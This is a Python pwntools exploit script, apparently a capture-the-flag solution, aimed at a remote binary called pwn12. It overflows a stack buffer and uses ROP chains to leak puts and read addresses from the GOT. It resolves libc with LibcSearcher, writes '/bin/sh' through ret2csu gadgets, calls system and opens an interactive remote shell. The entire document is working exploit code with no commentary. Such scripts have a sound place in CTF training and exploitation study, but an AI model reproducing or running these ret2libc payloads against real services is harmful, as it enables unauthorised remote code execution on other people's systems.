from pwn import *
from pwnlib import timeout
from LibcSearcher import *
from pwnlib.log import read_log_config


context(os='linux', arch='amd64', log_level='debug')

r = remote('111.200.241.244',62082)
#r = remote('127.0.0.1',10001)

elf = ELF("../pwn12")

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
read_plt = elf.plt['read']

start_addr          = 0x400550
pop_rdi             = 0x400763
universal_gadget1   = 0x40075a
universal_gadget2   = 0x400740
binsh_addr          = 0x601040  

payload = b"A"*72
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(start_addr)
payload = payload.ljust(200, b"B")
r.send(payload)
r.recvuntil('bye~\n')
puts_addr = u64(r.recv()[:-1].ljust(8, b'\x00'))

payload = b"A"*72
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(start_addr)
payload = payload.ljust(200, b"B")
r.send(payload)
r.recvuntil('bye~\n')
read_addr = u64(r.recv()[:-1].ljust(8, b'\x00'))

log.info("puts_addr = %#x", puts_addr)
log.info("read_addr = %#x", read_addr)

libc = LibcSearcher('read', read_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')

#system_addr = read_addr - 0xbbd20

payload = b"A"*72
payload += p64(universal_gadget1)
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(binsh_addr)
payload += p64(0)
payload += p64(universal_gadget2)
payload += b'\x00'*56
payload += p64(start_addr)
payload = payload.ljust(200, b"B")

r.send(payload)
r.recvuntil('bye~\n')
r.send("/bin/sh\x00")

payload = b"A"*72
payload += p64(0x04006ff)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload = payload.ljust(200, b"B")

r.send(payload)
r.interactive()